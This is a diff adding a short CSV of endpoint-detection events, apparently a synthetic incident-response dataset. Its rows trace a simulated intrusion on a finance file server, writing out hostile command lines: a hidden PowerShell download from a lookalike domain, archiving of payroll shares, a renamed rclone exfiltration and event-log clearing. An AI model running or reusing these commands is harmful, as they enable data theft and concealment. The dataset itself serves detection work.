@@ -1,0 +1,7 @@
+timestamp,event_id,hostname,username,process_name,parent_process,command_line,file_hash_sha256,severity,detection
+2026-09-28T01:00:00Z,EDR-00006,BKP-01,svc_backup,rsync,cron,rsync -az /mnt/fs-fin-01/ /backup/daily/,,info,Scheduled backup job
+2026-09-28T03:52:30Z,EDR-00001,FS-FIN-01,jdoe,powershell.exe,explorer.exe,powershell -w hidden -c iwr https://m1crosoft-secure.com/u.exe -OutFile C:\ProgramData\svchost_update.exe,,high,Suspicious PowerShell download cradle
+2026-09-28T03:58:00Z,EDR-00002,FS-FIN-01,jdoe,7z.exe,cmd.exe,7z.exe a -pAcme2026! C:\ProgramData\bk.7z D:\Shares\Finance\Payroll D:\Shares\Finance\Tax,,high,Password-protected archive of sensitive share
+2026-09-28T04:04:00Z,EDR-00003,FS-FIN-01,jdoe,svchost_update.exe,cmd.exe,svchost_update.exe copy C:\ProgramData\bk.7z fsync:bucket01 --transfers 8,9c3e6d1f2b7a4e8c5d0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d,critical,Renamed rclone binary executing cloud copy
+2026-09-28T04:30:00Z,EDR-00004,FS-FIN-01,jdoe,cmd.exe,svchost_update.exe,cmd /c del /f /q C:\ProgramData\bk.7z & wevtutil cl Security,,critical,Security event log cleared
+2026-09-28T06:12:00Z,EDR-00005,WS-ENG-011,mchen,chrome.exe,explorer.exe,chrome.exe --load-extension=coupon_helper,1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809,low,Potentially unwanted browser extension
